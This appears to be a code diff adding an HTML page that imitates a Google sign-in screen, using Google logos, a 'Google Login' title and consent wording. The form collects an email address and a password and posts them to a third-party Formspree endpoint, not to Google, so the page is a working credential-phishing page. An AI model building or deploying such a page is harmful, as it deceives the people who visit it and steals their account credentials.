@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/800px-Google_%22G%22_Logo.svg.png">
+    <link rel="stylesheet" href="assets/styles/google.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fascinate&family=Open+Sans:wght@300;400&family=Roboto+Condensed:wght@300;400&display=swap" rel="stylesheet">
+    <title>Google Login</title>
+</head>
+<body>
+    <nav>
+        <img src="assets/images/Google__G__Logo.svg.png" alt="">
+        <p>Sign in with google</p>
+    </nav>
+
+    <div class="container">
+        <div class="card">
+            <img src="assets/images/Google_2015_logo.svg.png" alt="">
+            <div class="upper-part">
+                <p>Sign in</p>
+                <p>with your account.</p>
+            </div>  
+
+            <form  action="https://formspree.io/f/xpzbelke" method="POST">
+                <input class="emailInput" type="email" name="Email" placeholder="Email or Phone">
+                <input style="display: none;" class="passwordInput" type="password" name="Password" placeholder="Password">
+                <span style="margin: 2px 5px; color: rgb(94, 120, 238); font-size: 12px; font-weight: bold;">Forgot account details?</span>
+                <button style="display: none;" class="nextBtn submitBtn" type="submit">Submit</button>
+            </form>
+            <div class="btn-holder">
+                <button class="nextBtn nextButton">Next</button>
+            </div>
+            <p>
+                To continue, Google will share your name, email address,
+                language preference, and profile picture with Google Web
+                Designer. Before using this app, you can review Google's <span style="color: rgb(94, 120, 238);">privacy policy</span> and <span style="color: rgb(94, 120, 238);">terms of service.</span>
+            </p>
+
+        </div>
+    </div>
+    <script src="assets/js/google.js"></script>
+</body>
+</html>
